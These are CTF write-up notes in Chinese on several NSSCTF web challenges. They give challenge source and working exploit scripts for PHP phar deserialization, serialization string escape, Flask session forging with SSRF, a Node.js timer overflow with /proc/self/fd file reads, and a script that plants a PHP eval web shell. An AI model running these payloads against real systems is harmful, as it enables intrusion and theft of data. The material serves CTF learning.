[TOC]
# NSSCTF prize_p1 反序列化/throw/gc/


https://www.bilibili.com/video/BV1DM4y137cp
https://www.wolai.com/iFdthhceLQBNqjotbQ7jFp
https://www.wolai.com/atao/aLs4wWxuPDLPUNNE45F9Es

题目
```php
<META http-equiv="Content-Type" content="text/html; charset=utf-8" />
<?php
highlight_file(__FILE__);
class getflag {
    function __destruct() {
        echo getenv("FLAG");
    }
}

class A {
    public $config;
    function __destruct() {
        if ($this->config == 'w') {
            $data = $_POST[0];
            if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $data)) {
                die("我知道你想干吗，我的建议是不要那样做。");
            }
            file_put_contents("./tmp/a.txt", $data);
        } else if ($this->config == 'r') {
            $data = $_POST[0];
            if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $data)) {
                die("我知道你想干吗，我的建议是不要那样做。");
            }
            echo file_get_contents($data);
        }
    }
}
if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $_GET[0])) {
    die("我知道你想干吗，我的建议是不要那样做。");
}
unserialize($_GET[0]);
throw new Error("那么就从这里开始起航吧");

```

## 第一关
* 设为null
* 生命周期结束
* unset
以上情况会执行destruct。gc机制垃圾回收
a:2:{i:0;0:4:"Test":0:{};i:0;N;}

知识点序列化格式
```php
<?php

class A{
    public $v1;
    public $v2;
}

$a = new A();
$a->v1 = '123';
echo serialize($a);

O:1:"A":1:{s:2:"v1";s:3:"123";}
O--第0个元素:1长度:"A"名称:1子元素:{
    s子元素1:2长度:"v1"名称;s子元素1:3长度:"123"值;
    s子元素2:2长度:"v2"名称;N值;} # 未赋值
    # 如果赋值 O:1:"A":2:{s:2:"v1";s:3:"123";s:2:"v2";s:3:"234";}
}
```
https://blog.csdn.net/Win_X_/article/details/111598941
```
O:表示序列化的事对象
< length>:表示序列化的类名称长度
< class name>：表示序列化的类的名称
< n >:表示被序列化的对象的属性个数
{…………}：属性列表
< field type >：属性类型
< field length >：属性名长度
< field name >：属性名
< field value type >：属性值类型
< field value >：属性值
a – array
b – boolean
d – double
i – integer
o – common object
r – reference
s – string
C – custom object
O – class
N – null
R – pointer reference
U – unicode string
https://www.cnblogs.com/webu/archive/2013/01/28/2879383.html
```


在有throw的时候，通过数组的这种二次赋值，让它变成unset进行垃圾回收。。

## 第二关 phar://反序列化
```php
if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $data)) {
    die('我知道你想干吗，我的建议是不要那样做');
}
```
https://guokeya.github.io/post/uxwHLckwx
https://www.anquanke.com/post/id/240007

一共就这5种可以触发phar的操作

> 普通phar
> gzip
> bzip2
> tar
> zip

php生成phar
```php
<?php
class Testobj
{
  var $output='';
}

@unlink('test.phar');   //删除之前的test.par文件(如果有)
$phar=new Phar('test.phar');  //创建一个phar对象，文件名必须以phar为后缀
$phar->startBuffering();  //开始写文件
$phar->setStub('<?php __HALT_COMPILER(); ?>');  //写入stub
$o=new Testobj();  
$o->output='eval($_GET["a"]);';  
$phar->setMetadata($o);//写入meta-data
$phar->addFromString("test.txt","test");  //添加要压缩的文件
$phar->stopBuffering();
?>
```

## 第三关 `throw new Error('那么就从这里开始吧');`

https://www.php.net/manual/zh/phar.fileformat.php

```php
<?php
class getflag{
    function __destruct() {
        echo 123;
    }
}

file_get_contents('phar//xen.phar');
```
cmd执行, 是可以输出123的。

`php /User/exp/2.php`

对应本题

```php
<?php
class getflag{
}
$a= new getflag();
$c = [$a];
echo serialize($c);
file_put_contents('.phar/.metadata', serialize($c));
```
得到 `a:1:{i:0;O:7:"getflag":0:{}}` , 通过第一关的学习。将元素1重新赋值为null，由于反序列化是从左到右的。立即可执行反序列化，不会直接throw。

> a:1:{i:0;O:7:"getflag":0:{}}
> a:1:{i:0;O:7:"getflag":0:{};i:0;N;}

其他思路
* file_put_contents 数组绕过
* 可以抛弃的签名

```php
<?php

$a = [
    0 => 2,
    1 => 'getflag'
]

if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $data)) {
    die('我知道你想干吗，我的建议是不要那样做');
}

file_put_contents("aaa", $a);
```

绕 throw https://irq5.io/2019/01/07/35c3-ctf-write-up-php/
## 脚本0 -- 重新生成签名

1.生成phar文件 
```php
<?php
class getflag{
}
$o = new getflag();
$phar = new Phar("app.phar");
$phar -> startBuffering();
$phar -> setStub("<?php __HALT_COMPILER();?>");
$phar -> setMetadata([0 =>$o, 1=> 9]); // 随便一个值，一会儿修改
$phar -> addFromString("test.txt","test");
$phar -> stopBuffering();
```
2.修改一下 app.phar中的内容
```
a:2:{i:0;O:7:"getflag":0:{}i:1;i:9;}  =>
a:2:{i:0;O:7:"getflag":0:{}i:0;i:9;}  // 取消掉引用getflag, 于是它马上gc实现垃圾回收, 不用到throw
```
3.重新生成phar签名, -8的位置是02所以是sha1签名
```python
import shutil
import tarfile
import os.path
import gzip
import requests


def resign(src, dst):
    from hashlib import sha1

    f = open(src, 'rb').read()
    s = f[:-28]
    e = f[-8:]

    sign = sha1(s).digest()

    b = s + sign + e
    open(dst, 'wb').write(b)



def make_gzipfile(output_filename, source_file):
    content = open(source_file, 'rb').read()
    f = gzip.open(output_filename, 'wb')
    f.write(content)
    f.close()


if __name__ == "__main__":
    src = 'app.phar'
    dst = 'app.phar1'
    resign(src, dst)
    make_gzipfile('app.gz', dst)

    url = 'http://localhost/?0=O:1:"A":1:{s:6:"config";s:1:"w";}'
    data = {"0": open('app.gz', 'rb').read()}
    requests.post(url, data=data)

    url = 'http://localhost/?0=O:1:"A":1:{s:6:"config";s:1:"r";}'
    data = {"0": 'phar://tmp/a.txt'}
    requests.post(url, data=data)
```

## 脚本1 -- 通过tar抛弃签名

```python
import shutil
import tarfile
import os.path
import gzip
import requests


def make_tarfile(output_filename, source_dir):
    os.system(f'tar -cf app.tar {source_dir}')
    # with tarfile.open(output_filename, "w:gz") as tar:   # 打ctf用system或py2/python2压tar, py3压的tar打不通, 而且py2压的没明文，不需要再加成gzip
    #     tar.add(source_dir, arcname=os.path.basename(source_dir))



def make_gzipfile(output_filename, source_file):
    content = open(source_file, 'rb').read()
    f = gzip.open(output_filename, 'wb')
    f.write(content)
    f.close()


def init():
    for f in ['app.tar', 'app.tar.gz', '.phar']:
        try:
            shutil.rmtree(f)
        except OSError:
            pass
    os.mkdir('.phar')
    open('.phar/.metadata', 'w').write("""a:1:{i:0;O:7:"getflag":0:{};i:0;N;}""")


if __name__ == "__main__":
    init()
    make_tarfile('app.tar', '.phar')
    make_gzipfile('app.tar.gz', 'app.tar')

    url = 'http://476-8d846a63-ef2a-4efd.nss.ctfer.vip:9080/?0=O:1:"A":1:{s:6:"config";s:1:"w";}'
    data = {"0": open('app.tar.gz', 'rb').read()}
    requests.post(url, data=data)

    url = 'http://476-8d846a63-ef2a-4efd.nss.ctfer.vip:9080/?0=O:1:"A":1:{s:6:"config";s:1:"r";}'
    data = {"0": 'phar://tmp/a.txt'}
    requests.post(url, data=data)
```

## 脚本2 - 绕过file_get_contents正则

只是少了gzip的部分。

```python
import shutil
import tarfile
import os.path
import gzip
import requests


def make_tarfile(output_filename, source_dir):
    os.system(f'tar -cf app.tar {source_dir}')


def init():
    for f in ['app.tar', 'app.tar.gz', '.phar']:
        try:
            shutil.rmtree(f)
        except OSError:
            pass
    os.mkdir('.phar')
    open('.phar/.metadata', 'w').write("""a:2:{i:0;O:7:"getflag":0:{}i:0;N;}""")


if __name__ == "__main__":
    init()
    make_tarfile('app.tar', '.phar')

    url = 'http://476-8d846a63-ef2a-4efd.nss.ctfer.vip:9080/?0=O:1:"A":1:{s:6:"config";s:1:"w";}'
    file = open('app.tar', 'rb').read()
    data = {"0[]": [
        file[:1],
        file[1:]
    ]} # 数组会把每个都写入的, 分段内容
    requests.post(url, data=data)

    url = 'http://476-8d846a63-ef2a-4efd.nss.ctfer.vip:9080/?0=O:1:"A":1:{s:6:"config";s:1:"r";}'
    data = {"0": 'phar://tmp/a.txt'}
    res = requests.post(url, data=data)
    open('f.html', 'wb').write(res.content)
```

# NSSCTF prize2 - nodejs 文件描述符
题目
```js
const { randomBytes } = require('crypto');
const express = require('express');
const fs = require('fs');
const fp = '/app/src/flag.txt';
const app = express();
const flag = Buffer(255);
const a = fs.open(fp, 'r', (err, fd) => {
    fs.read(fd, flag, 0, 44, 0, () => {
        fs.rm(fp, () => {});
    });
});

app.get('/', function (req, res) {
    res.set('Content-Type', 'text/javascript;charset=utf-8');
    res.send(fs.readFileSync(__filename));
});

app.get('/hint', function (req, res) {
    res.send(flag.toString().slice(0, randomBytes(1)[0]%32));
})

// 随机数预测或者一天之后
app.get('/getflag', function (req, res) {
    res.set('Content-Type', 'text/javascript;charset=utf-8');
    try {
        let a = req.query.a;
        if (a === randomBytes(3).toString()) {
            res.send(fs.readFileSync(req.query.b));
        } else {
            const t = setTimeout(() => {
                res.send(fs.readFileSync(req.query.b));
            }, parseInt(req.query.c)?Math.max(86400, parseInt(req.query.c)):86400);
        }
    } catch {
        res.send('?');
    }
})

app.listen(80, '0.0.0.0', () => {
    console.log('Start listening')
});
```
* 考点1 - setTimeout

https://nodejs.org/api/timers.html#timers_settimeout_callback_delay_args

When delay is larger than `2147483647` or less than `1`, the delay will be set to 1. Non-integer delays are truncated to an integer.

传过 2147483648 就能绕过

nodejs/setTimeout

* 考点2 文件描述符
writeup https://www.wolai.com/atao/tr9YDnm9jdvsejyPCfnRLL
wiki https://www.anquanke.com/post/id/241148#h2-8

/proc/self  -- 查看进程
/proc/11/fd
/proc/self/maps + /proc/self/mem  内存读取内容 见## 2021暗泉杯 DUNICTF hideandseek 

本题利用的是/prod/pid/fd

`cat /proc/42/cmdline`  --显示运行时命令
```
/proc/43/fd # ls
0 1 10 2
0 输入 1 输出  2 错误 10
```

__cmdline__

cmdline 文件存储着启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息。可以通过查看cmdline目录获取启动指定进程的完整命令：
```sh
cat /proc/2889/cmdline
```

__cwd__

cwd 文件是一个指向当前进程运行目录的符号链接。可以通过查看cwd文件获取目标指定进程环境的运行目录：

```sh
ls -al /proc/1090/cwd
lrwxrwxrwx 1 postgres postgres 0 Mar 6 20:19 /proc/1090/cwd →/var/Lib/postgresql/9.5/main
```

__exe__

exe 是一个指向启动当前进程的可执行文件（完整路径）的符号链接。通过exe文件我们可以获得指定进程的可执行文件的完整路径：
```sh
ls -al /proc/1090/exe
```

__environ__

environ 文件存储着当前进程的环境变量列表，彼此间用空字符（NULL）隔开。变量用大写字母表示，其值用小写字母表示。可以通过查看environ目录来获取指定进程的环境变量信息：
```
cat /proc/2889/environ
```

__fd__

fd 是一个目录，里面包含这当前进程打开的每一个文件的文件描述符（file descriptor），这些文件描述符是指向实际文件的一个符号链接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过fd目录里的文件获得指定进程打开的每个文件的路径以及文件内容。

查看指定进程打开的某个文件的路径：
```
ls -al /proc/1070/fd
```

__这个fd比较重要，因为在 linux 系统中，如果一个程序用open()打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 /proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。__


__self__
上面这些操作列出的都是目标环境指定进程的信息，但是我们在做题的时候往往需要的当前进程的信息，这时候就用到了 /proc 目录中的 self 子目录。

`/proc/self` 表示当前进程目录。前面说了通过 `/proc/$pid/` 来获取指定进程的信息。如果某个进程想要获取当前进程的系统信息，就可以通过进程的pid来访问/proc/$pid/目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了 /proc/self/ 目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于 /proc/本进程pid/ 。进程可以通过访问 /proc/self/ 目录来获取自己的系统信息，而不用每次都获取pid。

有了self目录就方便多了，下面我们演示一下self的常见使用。

获取当前启动进程的完整命令：
```
cat /proc/self/cmdline
```

当不知道目标网站的Web路径或当前路径时，这经常使用

获得当前进程的可执行文件的完整路径：
```
ls -al /proc/self/exe
cat /proc/self/environ
cat /proc/self/fd/{id}

```
其他题目可能通过
1./proc/$pid/environ
2.内存 即Web+pwn

## 非预期
靶场环境是炸了出错后自动重启的。。。
这里利用 fs.read 是异步操作来竞争，在它删除前进行读取。。。如果炸了环境会重启，又会生成新的flag.txt.所以不断访问这个文件即可有机会读取到。


```python
from time import sleep

import requests

url = 'http://731-247ece60-9330-4d0d.nss.ctfer.vip:9080/getflag?c=2147483648&b=/app/src/flag.txt'

i = 0
while True:
    sleep(0.5)
    print(i)
    i += 1
    res = requests.get(url)
    if res.status_code == 200:
        print(res.text)
        exit(0)
```


# NSSCTF prize3 - 限速|多线程下载

# NSSCTF prize4 - ez flask

进入开启bp, 抓包访问，提交表单，看到session里一段很长的flask的token签名。。。

```
Cookie: session=eyJhZG1pbiI6ZmFsc2UsImRhdGEiOnsiIGIiOiJNZz09In0sInVybCI6IjEifQ.YU2Iww.huCu4kQmY0WK1URUXDGcuZLhte4
```

base64解码前面的部分。  -- 小知识：flask token分3部分。payload+timestamp+签名, 中间用.分隔。

```
{"admin":false,"data":{" b":"Mg=="},"url":"1"}..Ø.0.à®âD&cE.ÕDT\1.¹.áµî
```

显然是提示想办法把admin修改为true。

页面里给了getkey链接

```python

@app.route('/getkey', methods=["GET"])
def getkey():
    if request.method != "GET":
        session["key"]=SECRET_KEY
```
它是GET方法，又不是GET方法。

搜索 request.method 。第一条官方文档写得非常直白

https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Methods

> HEAD
> HEAD方法请求一个与GET请求的响应相同的响应，但没有响应体。

即可在Response里得到一个key值。再用flask自带的方法签名一下内容。

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = b'your_key'

session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)

@app.route('/')
def index():
    print(session_serializer.dumps("your_data"))

index()
```

在开发者工具里修改cookie为新的签名。再访问/home页面得到源码。

```python

from flask import Flask, request, session, render_template, url_for,redirect,render_template_string
import base64
import urllib.request
import uuid
import flag

SECRET_KEY=str(uuid.uuid4())

app = Flask(__name__)
app.config.update(dict(
    SECRET_KEY=SECRET_KEY,
))

#src in /app

@app.route('/')
@app.route('/index',methods=['GET'])
def index():
    return render_template("index.html")

@app.route('/get_data', methods=["GET",'POST'])
def get_data():
    data = request.form.get('data', '123')
    if type(data) is str:
        data=data.encode('utf8')
    url = request.form.get('url', 'http://127.0.0.1:8888/')
    if data and url:
        session['data'] = data
        session['url'] = url
        session["admin"]=False
        return redirect(url_for('home'))
    return redirect(url_for('/'))

@app.route('/home', methods=["GET"])
def home():
    if session.get("admin",False):
        return render_template_string(open(__file__).read())
    else:
        return render_template("home.html",data=session.get('data','Not find data...'))

@app.route('/getkey', methods=["GET"])
def getkey():
    if request.method != "GET":
        session["key"]=SECRET_KEY
    return render_template_string('''@app.route('/getkey', methods=["GET"])
def getkey():
    if request.method != "GET":
        session["key"]=SECRET_KEY''')

@app.route('/get_hindd_result', methods=["GET"])
def get_hindd_result():
    if session['data'] and session['url']:
        if 'file:' in session['url']:
            return "no no no"
        data=(session['data']).decode('utf8')
        url_text=urllib.request.urlopen(session['url']).read().decode('utf8')
        if url_text in data or data in url_text:
            return "you get it"
    return "what ???"

@app.route('/getflag', methods=["GET"])
def get_flag():
    res = flag.waf(request)
    return res

if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=False, port=8888)
```

flag就在 flag.py文件里。

/get_hindd_result 过滤了file:协议，不能直接读取本地内容。。。大小写绕过

爆破脚本上。搞出flag.py

```py
def waf(req):
    if not req.base_url.startswith("http://127.0.0.1"):
        return "NoNo!!"
    if not req.full_path.endswith(".html?"):
        return "No!"
    return os.getenv("FLAG")
```

还是ssrf访问。继续爆flag。以.html?结束路径

### 完整脚本
```python
from urllib.request import Request

from requests_html import HTMLSession

base_url = 'http://1.14.71.254:28093'
# base_url = 'http://localhost:5000'
s = HTMLSession()


def step1():
    import base64
    import json

    url = '%s/getkey' % base_url

    res = s.head(url)
    print(res.text)

    session = res.headers.get('Set-Cookie')
    jwts = session.split('=')[1]
    j0 = jwts.split(';')[0].split('.')[0]

    d = base64.b64decode((j0 + '==').encode()).decode()

    d = json.loads(d)
    key = d.get('key')
    print(key)
    open('key.txt', 'w').write(key)


import flask_unsign

chars = '\n'
for i in range(32, 128):
    chars += chr(i)
from string import ascii_lowercase as al

chars = ' ' + al + chars.replace(al, '').replace(' ', '')


def step2():
    flag = 'def waf(req)'
    while True:
        for c in chars:  # 10-lf,13-cr
            txt = flag + c
            data = {'admin': False, 'data': txt.encode(), 'url': 'FILE:///app/flag.py'}  # work
            secret = open('key.txt', 'r').read()
            s.cookies.clear()
            session = flask_unsign.sign(data, secret)
            cookies = {"session": session}

            url = '%s/get_hindd_result' % base_url
            res = s.get(url, cookies=cookies)

            if 'you get it' in res.text:
                flag += c
                print(f'char:{c}, flag = {flag}')
                break
            else:
                print(f'{c}: {res.text}')
            if ord(c) == 127:
                raise Exception


def step3():
    flag = 'NSSCTF{'
    while True:
        for c in chars:  # 10-lf,13-cr
            txt = flag + c
            data = {'admin': False, 'data': txt.encode(), 'url': 'http://127.0.0.1:8888/getflag?1.html?'}  # work
            secret = open('key.txt', 'r').read()
            s.cookies.clear()
            session = flask_unsign.sign(data, secret)
            cookies = {"session": session}

            url = '%s/get_hindd_result' % base_url
            res = s.get(url, cookies=cookies)

            if 'you get it' in res.text:
                flag += c
                print(f'char:{c}, flag = {flag}')
                break
            else:
                print(f'{c}: {res.text}')
            if ord(c) == 127:
                raise Exception


if __name__ == '__main__':
    # step1()
    # step2()
    step3()
```




# NSSCTF prize5 - 反序列化

题目
```php
<?php
namespace myapp;
error_reporting(0);

class catalogue{
    public $class;
    public $data;
    public function __construct()
    {
        $this->class = "error";
        $this->data = "hacker";
    }
    public function __destruct()
    {
        echo new $this->class($this->data);
    }
}
class error{
    public function __construct($OTL)
    {
        $this->OTL = $OTL;
        echo ("hello ".$this->OTL);
    }
} 
class escape{
    public $name = 'OTL';
    public $phone = '123666';
    public $email = 'sweet@OTL.com';
}
function abscond($string) {
    $filter = array('NSS', 'CTF', 'OTL_QAQ', 'hello');
    $filter = '/' . implode('|', $filter) . '/i';
    return preg_replace($filter, 'hacker', $string);
}
if(isset($_GET['cata'])){
    if(!preg_match('/object/i',$_GET['cata'])){
        unserialize($_GET['cata']);
    }
    else{
        $cc = new catalogue();
        unserialize(serialize($cc));
    }
    if(isset($_POST['name'])&&isset($_POST['phone'])&&isset($_POST['email'])){
        if (preg_match("/flag/i",$_POST['email'])){
            die("nonono,you can not do that!");
        }
        $abscond = new escape();
        $abscond->name = $_POST['name'];
        $abscond->phone = $_POST['phone'];
        $abscond->email = $_POST['email'];
        $abscond = serialize($abscond);
        $escape = get_object_vars(unserialize(abscond($abscond)));
        if(is_array($escape['phone'])){
            echo base64_encode(file_get_contents($escape['email']));
        }
        else{
            echo "I'm sorry to tell you that you are wrong";
        }
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

## 关键处1
```php
    if(!preg_match('/object/i',$_GET['cata'])){
        unserialize($_GET['cata']);
    }
    else{
        $cc = new catalogue();
        unserialize(serialize($cc));
    }
```

通过观察存在的类，有一个析构函数的类可以直接利用外，没有其他可以使用。通过观察catalogue类的析构函数，是new一个新类，然后进行echo的操作，这里可以直接联想到原生类的利
用中目录读取文件的类 Directorylterator 类、Filesystemlterator 类以及GlobIterator类

这里只能回显一个文件，需要配合glob协议链接：PHP：glob://-Manual）使用，通过*号来匹配想要的文件名，Payload如下
https://www.php.net/manual/zh/wrappers.glob.php


```php
<?php
error_reporting(0);

class catalogue{
    public $class;
    public $data;
    public function __construct()
    {
        $this->class = "DirectoryIterator";
        $this->data = "glob:///*f*";
    }
}

echo serialize(new catalogue());
// O:9:"catalogue":2:{s:5:"class";s:17:"DirectoryIterator";s:4:"data";s:11:"glob:///*f*";}
```

`?cata=O:9:"catalogue":2:{s:5:"class";s:17:"DirectoryIterator";s:4:"data";s:11:"glob:///*f*";}`

得到文件地址为 /flag

## 第二步：读flag文件 

### 非预期
第二步:读flag文件非预期这里可以直接进行利用catalogue类的析构函数,通过 SplFileObjet类读取flag文件的内容,Payload如下

`?cata=0:9:"catalogue":2:{s:5:"cLass";S:13:"SpLFile0b\6Aect";s:4:"data";s:5:"/flag":}`


__原理：__
<div>?cata=0:9:"catalogue":2:{s:5:"cLass";s:13:"SpLFile0bject";s:4:"data";s:5:"/flag":}</div>
使用大写S可支持16进制解析
<div>?cata=0:9:"catalogue":2:{s:5:"cLass";<span style="color: red;">S</span>:13:"SpLFile0b\6Aect";s:4:"data";s:5:"/flag":}</div>

### 预期

```php
<?php
class escape{
    public $name = 'OTL';
    public $phone = array(1);
    public $email = '/flag';
}

$a = new escape();
echo serialize($a);
```

`O:6:"escape":3:{s:4:"name";s:3:"OTL";s:5:"phone";a:1:{i:0;i:1;}s:5:"email";s:5:"/flag";}`

由于会在email中检测flag过滤, 不能直接写。
phone要求array
那我们使用name参数通过abscond来绕过。

知识点: 反序列化的字符串后加任意字母不影响反序列化

```php
<?php
class escape{
    public $name = 'OTL';
}

$escape = serialize(new escape()) . 'aasdfdsf';
var_dump(unserialize($escape));
```

`O:6:"escape":1:{s:4:"name";s:3:"OTL";}123123123` 这种正常能解析的在后面添加字符不影响解析。所以替换后前面的符合反序列化信息即可。

保证 s:数字 长度正确。 
```
NSS/CTF->hacker,长度-3
OTL_QAQ->hacker,长度+1
hello->hacker,长度-1

";s:5:"phone";a:1:{i:0;i:1;}s:5:"email";s:5:"/flag";}   长度为53
53/3 = 17 余2
用 17个CTF + 2个hello。正好吃掉53个字符
```

预期继续往下看代码,可以知道是一个反序列化的逃逸,最后构造的Payload如下

`CTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFhelLohelLo";s:5:"phone";a:1:{i:8;i:1;s:5:"email";s:5:"/flag":}`


```python
from requests_html import HTMLSession

s = HTMLSession()
data = {
    "name": 'CTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFCTFhellohello";s:5:"phone";a:1:{i:0;i:1;}s:5:"email";s:5:"/flag";}',
    'phone': '123',
    'email': '12'
}
res = s.post('http://11304-eb1d33fb-a8f1-403a.nss.ctfer.vip:9080/?cata=123', data=data)
import base64
print(base64.b64decode(res.content))
```


# NSSCTF prize6
https://github.com/wm-team/WMCTF2020-WriteUp/blob/master/WMCTF%202020%E5%AE%98%E6%96%B9WriteUp.md

https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/

https://lanvnal.com/2020/10/25/2020-gong-ye-hu-lian-wang-an-quan-xue-sheng-zu-chu-sai-wp/

题目

```php
<?php

function x(){
    exit();
}

if(isset($_GET['f'])){
    $content = $_GET['content'];
    if (preg_match('/index|function|x|iconv|UCS|UTF|rot|zlib|quoted|base64|%|toupper|tolower|strip_tags|dechunk|\.\./i', $content)) {
        die('hacker');
    }
    if ($_GET['f'] == "create"){
        file_put_contents($content, '<?=x();?>' . $content);
    }
    elseif ($_GET['f'] == "edit"){
        $s1 = $_GET['s1'];
        $s2 = $_GET['s2'];
        if (strlen($s1) > 20 || strlen($s2) > 20 || preg_match('/\=|x| |\?|\<|\>|\(|\)/i', $s1) || preg_match('/\=|x| |\?|\<|\>|\(|\)/i', $s2)) {
            die('hacker');
        }
        if(file_exists($content)){
            $s = file_get_contents($content);
            $s = str_replace($s1, $s2, $s);
            file_put_contents($content, $s);
        }
        else{
            die("file no exits!");
        }

    }
    else{
        include($content);
    }
}else{
    highlight_file(__FILE__);
}
?>
```

直接数组绕过
```python
import pprint
from requests_html import HTMLSession

url = 'http://192.168.61.141/1.php'
# url = 'http://11726-288c65e8-2d63-4075.nss.ctfer.vip:9080/'
params = {
    'f': 'create',
    'content': 'shell3.php',
}
params2 = {
    'f': 'edit',
    'content': 'shell3.php',
    's1[]': "x();",
    's2[]': "eval($_POST['cmd']);"
}

proxies = {}

s = HTMLSession()
s.get(url, params=params, proxies=proxies)
s.get(url, params=params2, proxies=proxies)
res = s.post('http://192.168.61.141/shell3.php', data={'cmd': "system('ls');"})
pprint.pprint(res.text)
```


# SWPU新生赛 // 2021WLLMCTF新生赛


[[NSSCTF 2021]招新赛Crypto出题人笔记](https://www.wd-ljt.com/post/1016/607.html)
[[NSSCTF 2021]招新赛Pwn出题人笔记](https://www.wd-ljt.com/post/1016/603.html)
[[NSSCTF 2021]招新赛Misc出题人笔记](https://www.wd-ljt.com/post/1012/598.html)
[[NSSCTF 2021]招新赛Reverse出题人笔记](https://www.wd-ljt.com/post/1016/609.html)

https://blog.csdn.net/qq_42880719/
加2021WLLMCTF新生赛官方WP.pdf


